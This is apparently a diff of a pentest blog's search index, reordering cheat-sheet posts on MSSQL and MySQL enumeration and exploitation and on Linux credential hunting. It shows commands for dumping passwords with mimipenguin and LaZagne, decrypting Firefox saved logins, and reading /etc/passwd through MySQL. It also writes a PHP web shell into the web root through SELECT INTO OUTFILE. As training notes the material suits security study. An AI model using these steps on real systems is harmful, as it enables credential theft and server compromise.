@@ -189,58 +189,44 @@
       </tags>
   </entry>
   <entry>
-    <title>Mssql Enumeration</title>
-    <url>/2025/11/20/Mssql-Enumeration/</url>
-    <content><![CDATA[<h1 id="Connect-To-The-Data-Base"><a href="#Connect-To-The-Data-Base" class="headerlink" title="Connect To The Data Base"></a>Connect To The Data Base</h1><h2 id="SQL-Authentication"><a href="#SQL-Authentication" class="headerlink" title="SQL Authentication"></a>SQL Authentication</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><h5 id="sqlcmd"><a href="#sqlcmd" class="headerlink" title="sqlcmd"></a>sqlcmd</h5><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">sqlcmd -S target -U username -P &#x27;password&#x27; -y <span class="number">30</span> -Y <span class="number">30</span></span><br></pre></td></tr></table></figure>
+    <title>Memory ,Cache And Browser</title>
+    <url>/2025/11/27/Memory-and-cache/</url>
+    <content><![CDATA[<h2 id="Mimipenguin-root-access-is-required"><a href="#Mimipenguin-root-access-is-required" class="headerlink" title="Mimipenguin ( root access is required )"></a>Mimipenguin ( root access is required )</h2><p>➜ Many applications and processes work with credentials needed for authentication and store them either in memory or in files so that they can be reused.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> python3 mimipenguin.py</span><br><span class="line"></span><br><span class="line">[SYSTEM - GNOME]	cry0l1t3:WLpAEXFa0SbqOHY</span><br></pre></td></tr></table></figure>
 
-<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h5 id="sqsh"><a href="#sqsh" class="headerlink" title="sqsh"></a>sqsh</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U username -P <span class="string">&#x27;password&#x27;</span> -h</span><br></pre></td></tr></table></figure>
-
-<h5 id="mssqlclient"><a href="#mssqlclient" class="headerlink" title="mssqlclient"></a>mssqlclient</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-mssqlclient username@target</span><br></pre></td></tr></table></figure>
-
+<h2 id="LaZagne-Root-recommended-but-not-always-required"><a href="#LaZagne-Root-recommended-but-not-always-required" class="headerlink" title="LaZagne ( Root recommended, but not always required )"></a>LaZagne ( Root recommended, but not always required )</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> python2.7 laZagne.py all</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------------------- Shadow passwords -----------------</span><br><span class="line"></span><br><span class="line">[+] Hash found !!!</span><br><span class="line">Login: systemd-coredump</span><br><span class="line">Hash: !!:18858::::::</span><br><span class="line"></span><br><span class="line">[+] Hash found !!!</span><br><span class="line">Login: sambauser</span><br><span class="line">Hash: $6<span class="variable">$wgK4tGq7Jepa</span>.V0g<span class="variable">$QkxvseL</span>.xkC3jo682xhSGoXXOGcBwPLc2CrAPugD6PYXWQlBkiwwFs7x/fhI.8negiUSPqaWyv7wC8uwsWPrx1:18862:0:99999:7:::</span><br><span class="line"></span><br><span class="line">[+] Password found !!!</span><br><span class="line">Login: cry0l1t3</span><br><span class="line">Password: WLpAEXFa0SbqOHY</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] 3 passwords have been found.</span><br><span class="line">For more information launch it again with the -v option</span><br><span class="line"></span><br><span class="line">elapsed <span class="keyword">time</span> = 3.50091600418</span><br></pre></td></tr></table></figure>
 
 
-<h2 id="Windows-Authentication-Local-Account"><a href="#Windows-Authentication-Local-Account" class="headerlink" title="Windows Authentication (Local Account)"></a>Windows Authentication (Local Account)</h2><h3 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h3><h5 id="sqsh-1"><a href="#sqsh-1" class="headerlink" title="sqsh"></a>sqsh</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U .\\username -P <span class="string">&#x27;password&#x27;</span> -h</span><br></pre></td></tr></table></figure>
+<p>LaZagne without root</p>
+<ul>
+<li><code>browser passwords (if user profile is readable)</code></li>
+<li><code>Git credentials</code></li>
+<li><code>SSH keys</code></li>
+<li><code>environment variables</code></li>
+<li><code>configuration files</code></li>
+</ul>
+<h2 id="Browser-redentials"><a href="#Browser-redentials" class="headerlink" title="Browser redentials"></a>Browser redentials</h2><h3 id="Firefox"><a href="#Firefox" class="headerlink" title="Firefox"></a>Firefox</h3><h4 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h4><p>By default, Firefox stores saved credentials in an encrypted file named <code>logins.json</code>.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -l .mozilla/firefox/ | grep default </span><br><span class="line"></span><br><span class="line">drwx------ 11 cry0l1t3 cry0l1t3 4096 Jan 28 16:02 1bplpd86.default-release</span><br><span class="line">drwx------  2 cry0l1t3 cry0l1t3 4096 Jan 28 13:30 lfx3lvhb.default</span><br></pre></td></tr></table></figure>
 
 
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U HOSTNAME\\username -P <span class="string">&#x27;password&#x27;</span> -h</span><br></pre></td></tr></table></figure>
-
-
-<h5 id="mssqlclient-1"><a href="#mssqlclient-1" class="headerlink" title="mssqlclient"></a>mssqlclient</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-mssqlclient username@target -windows-auth</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Domain-Authentication-With-DC"><a href="#Domain-Authentication-With-DC" class="headerlink" title="Domain Authentication (With DC)"></a>Domain Authentication (With DC)</h2><h3 id="Linux-2"><a href="#Linux-2" class="headerlink" title="Linux"></a>Linux</h3><h5 id="sqsh-2"><a href="#sqsh-2" class="headerlink" title="sqsh"></a>sqsh</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqsh -S target -U domain\username -P password</span><br></pre></td></tr></table></figure>
-
-<h5 id="mssqlclient-2"><a href="#mssqlclient-2" class="headerlink" title="mssqlclient"></a>mssqlclient</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-mssqlclient domain/username:password@target</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="Enumerate-Data-Base"><a href="#Enumerate-Data-Base" class="headerlink" title="Enumerate Data Base"></a>Enumerate Data Base</h1><h2 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h2><h3 id="sqlcmd-1"><a href="#sqlcmd-1" class="headerlink" title="sqlcmd"></a>sqlcmd</h3><p>When using <code>sqlcmd</code>, each query must be followed by <code>GO</code> to trigger its execution.</p>
-<h5 id="List-Databases"><a href="#List-Databases" class="headerlink" title="List Databases"></a>List Databases</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; <span class="built_in">SELECT</span> name FROM master.dbo.sysdatabases</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br></pre></td></tr></table></figure>
-
-<h5 id="Select-Database"><a href="#Select-Database" class="headerlink" title="Select Database"></a>Select Database</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; USE htbusers</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br></pre></td></tr></table></figure>
-
-<h5 id="List-Tables"><a href="#List-Tables" class="headerlink" title="List Tables"></a>List Tables</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; <span class="built_in">SELECT</span> table_name FROM htbusers.INFORMATION_SCHEMA.TABLES</span><br><span class="line"><span class="number">2</span>&gt; GO</span><br></pre></td></tr></table></figure>
-
-<h5 id="Dump-Specific-Table"><a href="#Dump-Specific-Table" class="headerlink" title="Dump Specific Table"></a>Dump Specific Table</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>&gt; <span class="built_in">SELECT</span> * FROM users</span><br><span class="line"><span class="number">2</span>&gt; go</span><br></pre></td></tr></table></figure>
-
-<h2 id="Linux-3"><a href="#Linux-3" class="headerlink" title="Linux"></a>Linux</h2><h3 id="Mssqlclient"><a href="#Mssqlclient" class="headerlink" title="Mssqlclient"></a>Mssqlclient</h3><h5 id="List-Databases-1"><a href="#List-Databases-1" class="headerlink" title="List Databases"></a>List Databases</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SQL (htbdbuser  guest@master)&gt; SELECT name FROM sys.databases;</span><br></pre></td></tr></table></figure>
-
-
-<h5 id="Select-Database-1"><a href="#Select-Database-1" class="headerlink" title="Select Database"></a>Select Database</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SQL (htbdbuser  guest@master)&gt; use database-name</span><br></pre></td></tr></table></figure>
-
-<h5 id="List-Tables-1"><a href="#List-Tables-1" class="headerlink" title="List Tables"></a>List Tables</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE=<span class="string">&#x27;BASE TABLE&#x27;</span> ORDER BY TABLE_SCHEMA, TABLE_NAME;</span><br></pre></td></tr></table></figure>
-
-<h5 id="Dump-Specific-Table-1"><a href="#Dump-Specific-Table-1" class="headerlink" title="Dump Specific Table"></a>Dump Specific Table</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM table-name;</span><br></pre></td></tr></table></figure>
-
-]]></content>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> .mozilla/firefox/1bplpd86.default-release/logins.json | jq .</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;nextId&quot;</span>: 2,</span><br><span class="line">  <span class="string">&quot;logins&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;id&quot;</span>: 1,</span><br><span class="line">      <span class="string">&quot;hostname&quot;</span>: <span class="string">&quot;https://www.inlanefreight.com&quot;</span>,</span><br><span class="line">      <span class="string">&quot;httpRealm&quot;</span>: null,</span><br><span class="line">      <span class="string">&quot;formSubmitURL&quot;</span>: <span class="string">&quot;https://www.inlanefreight.com&quot;</span>,</span><br><span class="line">      <span class="string">&quot;usernameField&quot;</span>: <span class="string">&quot;username&quot;</span>,</span><br><span class="line">      <span class="string">&quot;passwordField&quot;</span>: <span class="string">&quot;password&quot;</span>,</span><br><span class="line">      <span class="string">&quot;encryptedUsername&quot;</span>: <span class="string">&quot;MDoEEPgAAAA...SNIP...1liQiqBBAG/8/UpqwNlEPScm0uecyr&quot;</span>,</span><br><span class="line">      <span class="string">&quot;encryptedPassword&quot;</span>: <span class="string">&quot;MEIEEPgAAAA...SNIP...FrESc4A3OOBBiyS2HR98xsmlrMCRcX2T9Pm14PMp3bpmE=&quot;</span>,</span><br><span class="line">      <span class="string">&quot;guid&quot;</span>: <span class="string">&quot;&#123;412629aa-4113-4ff9-befe-dd9b4ca388e2&#125;&quot;</span>,</span><br><span class="line">      <span class="string">&quot;encType&quot;</span>: 1,</span><br><span class="line">      <span class="string">&quot;timeCreated&quot;</span>: 1643373110869,</span><br><span class="line">      <span class="string">&quot;timeLastUsed&quot;</span>: 1643373110869,</span><br><span class="line">      <span class="string">&quot;timePasswordChanged&quot;</span>: 1643373110869,</span><br><span class="line">      <span class="string">&quot;timesUsed&quot;</span>: 1</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="string">&quot;potentiallyVulnerablePasswords&quot;</span>: [],</span><br><span class="line">  <span class="string">&quot;dismissedBreachAlertsByLoginGUID&quot;</span>: &#123;&#125;,</span><br><span class="line">  <span class="string">&quot;version&quot;</span>: 3</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="Decrypt"><a href="#Decrypt" class="headerlink" title="Decrypt"></a>Decrypt</h4><p>To decrypt saved credentials we can use <a href="https://github.com/unode/firefox_decrypt">firefox_decrypt</a></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3.9 firefox_decrypt.py</span><br><span class="line"></span><br><span class="line">Select the Mozilla profile you wish to decrypt</span><br><span class="line">1 -&gt; lfx3lvhb.default</span><br><span class="line">2 -&gt; 1bplpd86.default-release</span><br><span class="line"></span><br><span class="line">2</span><br><span class="line"></span><br><span class="line">Website:   https://testing.dev.inlanefreight.com</span><br><span class="line">Username: <span class="string">&#x27;test&#x27;</span></span><br><span class="line">Password: <span class="string">&#x27;test&#x27;</span></span><br><span class="line"></span><br><span class="line">Website:   https://www.inlanefreight.com</span><br><span class="line">Username: <span class="string">&#x27;cry0l1t3&#x27;</span></span><br><span class="line">Password: <span class="string">&#x27;FzXUxJemKm6g2lGh&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
       <categories>
-        <category>Active Directory</category>
-        <category>Service-Enumeration</category>
-        <category>MSSQL</category>
+        <category>Linux</category>
+        <category>Post-Exploitation</category>
+        <category>Credential Hunting</category>
       </categories>
       <tags>
-        <tag>MSSQL</tag>
-        <tag>Enumeration</tag>
+        <tag>browser-credentials</tag>
+        <tag>LaZagne</tag>
+        <tag>Mimipenguin</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>Memory and cache</title>
+    <url>/2025/11/27/Memory-and-cache-1/</url>
+    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>Mssql Exploitation</title>
@@ -319,81 +305,6 @@
       </tags>
   </entry>
   <entry>
-    <title>MySQL Exploitation</title>
-    <url>/2025/11/21/MySQL-Exploitation/</url>
-    <content><![CDATA[<h1 id="Secure-File-Privileges"><a href="#Secure-File-Privileges" class="headerlink" title="Secure File Privileges"></a>Secure File Privileges</h1><p><code>secure_file_priv</code> in <strong>MySQL</strong> controls where you can read&#x2F;write files.</p>
-<ul>
-<li><p>Only users with the <strong>FILE privilege</strong> can use <code>LOAD DATA</code>, <code>SELECT INTO OUTFILE</code>, or <code>LOAD_FILE()</code>.</p>
-</li>
-<li><p><strong>Settings: of Secure File Privileges</strong></p>
-<ul>
-<li><p><strong>Empty:</strong> No restriction (not secure).</p>
-</li>
-<li><p><strong>Directory path:</strong> Can only read&#x2F;write in that folder.</p>
-</li>
-<li><p><strong>NULL:</strong> File operations are disabled.</p>
-</li>
-</ul>
-</li>
-</ul>
-<h4 id="Example"><a href="#Example" class="headerlink" title="Example :"></a>Example :</h4><p>In the following example, the <code>secure_file_priv</code> variable is empty, which means MySQL can read and write files from <strong>any directory</strong> that the MySQL service account has permission to access.</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> variables <span class="keyword">like</span> &quot;secure_file_priv&quot;;</span><br><span class="line"></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name    <span class="operator">|</span> <span class="keyword">Value</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> secure_file_priv <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.005</span> sec)</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="Read-Local-Files"><a href="#Read-Local-Files" class="headerlink" title="Read Local Files"></a>Read Local Files</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> LOAD_FILE(&quot;/etc/passwd&quot;);</span><br><span class="line"></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------+</span></span><br><span class="line"><span class="operator">|</span> LOAD_FILE(&quot;/etc/passwd&quot;)</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------------+</span></span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:<span class="operator">/</span>root:<span class="operator">/</span>bin<span class="operator">/</span>bash</span><br><span class="line">daemon:x:<span class="number">1</span>:<span class="number">1</span>:daemon:<span class="operator">/</span>usr<span class="operator">/</span>sbin:<span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>nologin</span><br><span class="line">bin:x:<span class="number">2</span>:<span class="number">2</span>:bin:<span class="operator">/</span>bin:<span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>nologin</span><br><span class="line">sys:x:<span class="number">3</span>:<span class="number">3</span>:sys:<span class="operator">/</span>dev:<span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>nologin</span><br><span class="line">sync:x:<span class="number">4</span>:<span class="number">65534</span>:sync:<span class="operator">/</span>bin:<span class="operator">/</span>bin<span class="operator">/</span>sync</span><br><span class="line"></span><br><span class="line"><span class="operator">&lt;</span>SNIP<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-<h1 id="MySQL-Write-File"><a href="#MySQL-Write-File" class="headerlink" title="MySQL - Write File"></a>MySQL - Write File</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> &quot;&lt;?php echo shell_exec($_GET[&#x27;c&#x27;]);?&gt;&quot; <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/www/html/webshell.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">Query OK, <span class="number">1</span> <span class="type">row</span> affected (<span class="number">0.001</span> sec)</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Linux</category>
-        <category>Service-Exploitation</category>
-        <category>MySQL</category>
-      </categories>
-      <tags>
-        <tag>MySQL</tag>
-        <tag>Exploitation</tag>
-        <tag>MySQL-Read-Files</tag>
-        <tag>MySQL-Write-Files</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Memory and cache</title>
-    <url>/2025/11/27/Memory-and-cache/</url>
-    <content><![CDATA[<h2 id="Mimipenguin-root-access-is-required"><a href="#Mimipenguin-root-access-is-required" class="headerlink" title="Mimipenguin ( root access is required )"></a>Mimipenguin ( root access is required )</h2><p>➜ Many applications and processes work with credentials needed for authentication and store them either in memory or in files so that they can be reused.</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> python3 mimipenguin.py</span><br><span class="line"></span><br><span class="line">[SYSTEM - GNOME]	cry0l1t3:WLpAEXFa0SbqOHY</span><br></pre></td></tr></table></figure>
-
-<h2 id="LaZagne-Root-recommended-but-not-always-required"><a href="#LaZagne-Root-recommended-but-not-always-required" class="headerlink" title="LaZagne ( Root recommended, but not always required )"></a>LaZagne ( Root recommended, but not always required )</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> python2.7 laZagne.py all</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------------------- Shadow passwords -----------------</span><br><span class="line"></span><br><span class="line">[+] Hash found !!!</span><br><span class="line">Login: systemd-coredump</span><br><span class="line">Hash: !!:18858::::::</span><br><span class="line"></span><br><span class="line">[+] Hash found !!!</span><br><span class="line">Login: sambauser</span><br><span class="line">Hash: $6<span class="variable">$wgK4tGq7Jepa</span>.V0g<span class="variable">$QkxvseL</span>.xkC3jo682xhSGoXXOGcBwPLc2CrAPugD6PYXWQlBkiwwFs7x/fhI.8negiUSPqaWyv7wC8uwsWPrx1:18862:0:99999:7:::</span><br><span class="line"></span><br><span class="line">[+] Password found !!!</span><br><span class="line">Login: cry0l1t3</span><br><span class="line">Password: WLpAEXFa0SbqOHY</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] 3 passwords have been found.</span><br><span class="line">For more information launch it again with the -v option</span><br><span class="line"></span><br><span class="line">elapsed <span class="keyword">time</span> = 3.50091600418</span><br></pre></td></tr></table></figure>
-
-
-<p>LaZagne without root</p>
-<ul>
-<li><code>browser passwords (if user profile is readable)</code></li>
-<li><code>Git credentials</code></li>
-<li><code>SSH keys</code></li>
-<li><code>environment variables</code></li>
-<li><code>configuration files</code></li>
-</ul>
-<h2 id="Browser-credentials"><a href="#Browser-credentials" class="headerlink" title="Browser credentials"></a>Browser credentials</h2><h3 id="Firefox"><a href="#Firefox" class="headerlink" title="Firefox"></a>Firefox</h3><h4 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h4><p>By default, Firefox stores saved credentials in an encrypted file named <code>logins.json</code>.</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -l .mozilla/firefox/ | grep default </span><br><span class="line"></span><br><span class="line">drwx------ 11 cry0l1t3 cry0l1t3 4096 Jan 28 16:02 1bplpd86.default-release</span><br><span class="line">drwx------  2 cry0l1t3 cry0l1t3 4096 Jan 28 13:30 lfx3lvhb.default</span><br></pre></td></tr></table></figure>
-
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> .mozilla/firefox/1bplpd86.default-release/logins.json | jq .</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;nextId&quot;</span>: 2,</span><br><span class="line">  <span class="string">&quot;logins&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;id&quot;</span>: 1,</span><br><span class="line">      <span class="string">&quot;hostname&quot;</span>: <span class="string">&quot;https://www.inlanefreight.com&quot;</span>,</span><br><span class="line">      <span class="string">&quot;httpRealm&quot;</span>: null,</span><br><span class="line">      <span class="string">&quot;formSubmitURL&quot;</span>: <span class="string">&quot;https://www.inlanefreight.com&quot;</span>,</span><br><span class="line">      <span class="string">&quot;usernameField&quot;</span>: <span class="string">&quot;username&quot;</span>,</span><br><span class="line">      <span class="string">&quot;passwordField&quot;</span>: <span class="string">&quot;password&quot;</span>,</span><br><span class="line">      <span class="string">&quot;encryptedUsername&quot;</span>: <span class="string">&quot;MDoEEPgAAAA...SNIP...1liQiqBBAG/8/UpqwNlEPScm0uecyr&quot;</span>,</span><br><span class="line">      <span class="string">&quot;encryptedPassword&quot;</span>: <span class="string">&quot;MEIEEPgAAAA...SNIP...FrESc4A3OOBBiyS2HR98xsmlrMCRcX2T9Pm14PMp3bpmE=&quot;</span>,</span><br><span class="line">      <span class="string">&quot;guid&quot;</span>: <span class="string">&quot;&#123;412629aa-4113-4ff9-befe-dd9b4ca388e2&#125;&quot;</span>,</span><br><span class="line">      <span class="string">&quot;encType&quot;</span>: 1,</span><br><span class="line">      <span class="string">&quot;timeCreated&quot;</span>: 1643373110869,</span><br><span class="line">      <span class="string">&quot;timeLastUsed&quot;</span>: 1643373110869,</span><br><span class="line">      <span class="string">&quot;timePasswordChanged&quot;</span>: 1643373110869,</span><br><span class="line">      <span class="string">&quot;timesUsed&quot;</span>: 1</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="string">&quot;potentiallyVulnerablePasswords&quot;</span>: [],</span><br><span class="line">  <span class="string">&quot;dismissedBreachAlertsByLoginGUID&quot;</span>: &#123;&#125;,</span><br><span class="line">  <span class="string">&quot;version&quot;</span>: 3</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h4 id="Decrypt"><a href="#Decrypt" class="headerlink" title="Decrypt"></a>Decrypt</h4><p>To decrypt saved credentials we can use <a href="https://github.com/unode/firefox_decrypt">firefox_decrypt</a></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3.9 firefox_decrypt.py</span><br><span class="line"></span><br><span class="line">Select the Mozilla profile you wish to decrypt</span><br><span class="line">1 -&gt; lfx3lvhb.default</span><br><span class="line">2 -&gt; 1bplpd86.default-release</span><br><span class="line"></span><br><span class="line">2</span><br><span class="line"></span><br><span class="line">Website:   https://testing.dev.inlanefreight.com</span><br><span class="line">Username: <span class="string">&#x27;test&#x27;</span></span><br><span class="line">Password: <span class="string">&#x27;test&#x27;</span></span><br><span class="line"></span><br><span class="line">Website:   https://www.inlanefreight.com</span><br><span class="line">Username: <span class="string">&#x27;cry0l1t3&#x27;</span></span><br><span class="line">Password: <span class="string">&#x27;FzXUxJemKm6g2lGh&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Linux</category>
-        <category>Post-Exploitation</category>
-        <category>Credential Hunting</category>
-      </categories>
-      <tags>
-        <tag>browser-credentials</tag>
-        <tag>LaZagne</tag>
-        <tag>Mimipenguin</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>MySQL Enumeration</title>
     <url>/2025/11/21/MySQL-Enumeration/</url>
     <content><![CDATA[<h1 id="Connect-To-The-Server"><a href="#Connect-To-The-Server" class="headerlink" title="Connect To The Server"></a>Connect To The Server</h1><h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -u username -p&lt;password&gt; -h target</span><br></pre></td></tr></table></figure>
@@ -431,6 +342,46 @@
       <tags>
         <tag>Enumeration</tag>
         <tag>MySQL</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MySQL Exploitation</title>
+    <url>/2025/11/21/MySQL-Exploitation/</url>
+    <content><![CDATA[<h1 id="Secure-File-Privileges"><a href="#Secure-File-Privileges" class="headerlink" title="Secure File Privileges"></a>Secure File Privileges</h1><p><code>secure_file_priv</code> in <strong>MySQL</strong> controls where you can read&#x2F;write files.</p>
+<ul>
+<li><p>Only users with the <strong>FILE privilege</strong> can use <code>LOAD DATA</code>, <code>SELECT INTO OUTFILE</code>, or <code>LOAD_FILE()</code>.</p>
+</li>
+<li><p><strong>Settings: of Secure File Privileges</strong></p>
+<ul>
+<li><p><strong>Empty:</strong> No restriction (not secure).</p>
+</li>
+<li><p><strong>Directory path:</strong> Can only read&#x2F;write in that folder.</p>
+</li>
+<li><p><strong>NULL:</strong> File operations are disabled.</p>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="Example"><a href="#Example" class="headerlink" title="Example :"></a>Example :</h4><p>In the following example, the <code>secure_file_priv</code> variable is empty, which means MySQL can read and write files from <strong>any directory</strong> that the MySQL service account has permission to access.</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> variables <span class="keyword">like</span> &quot;secure_file_priv&quot;;</span><br><span class="line"></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name    <span class="operator">|</span> <span class="keyword">Value</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> secure_file_priv <span class="operator">|</span>       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.005</span> sec)</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Read-Local-Files"><a href="#Read-Local-Files" class="headerlink" title="Read Local Files"></a>Read Local Files</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> LOAD_FILE(&quot;/etc/passwd&quot;);</span><br><span class="line"></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------+</span></span><br><span class="line"><span class="operator">|</span> LOAD_FILE(&quot;/etc/passwd&quot;)</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------------+</span></span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:<span class="operator">/</span>root:<span class="operator">/</span>bin<span class="operator">/</span>bash</span><br><span class="line">daemon:x:<span class="number">1</span>:<span class="number">1</span>:daemon:<span class="operator">/</span>usr<span class="operator">/</span>sbin:<span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>nologin</span><br><span class="line">bin:x:<span class="number">2</span>:<span class="number">2</span>:bin:<span class="operator">/</span>bin:<span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>nologin</span><br><span class="line">sys:x:<span class="number">3</span>:<span class="number">3</span>:sys:<span class="operator">/</span>dev:<span class="operator">/</span>usr<span class="operator">/</span>sbin<span class="operator">/</span>nologin</span><br><span class="line">sync:x:<span class="number">4</span>:<span class="number">65534</span>:sync:<span class="operator">/</span>bin:<span class="operator">/</span>bin<span class="operator">/</span>sync</span><br><span class="line"></span><br><span class="line"><span class="operator">&lt;</span>SNIP<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<h1 id="MySQL-Write-File"><a href="#MySQL-Write-File" class="headerlink" title="MySQL - Write File"></a>MySQL - Write File</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> &quot;&lt;?php echo shell_exec($_GET[&#x27;c&#x27;]);?&gt;&quot; <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/www/html/webshell.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">Query OK, <span class="number">1</span> <span class="type">row</span> affected (<span class="number">0.001</span> sec)</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Linux</category>
+        <category>Service-Exploitation</category>
+        <category>MySQL</category>
+      </categories>
+      <tags>
+        <tag>MySQL</tag>
+        <tag>Exploitation</tag>
+        <tag>MySQL-Read-Files</tag>
+        <tag>MySQL-Write-Files</tag>
       </tags>
   </entry>
   <entry>
@@ -587,6 +538,60 @@
         <tag>socat</tag>
         <tag>Reverse-Port-Forwarding</tag>
         <tag>Chisel</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Mssql Enumeration</title>
+    <url>/2025/11/20/Mssql-Enumeration/</url>
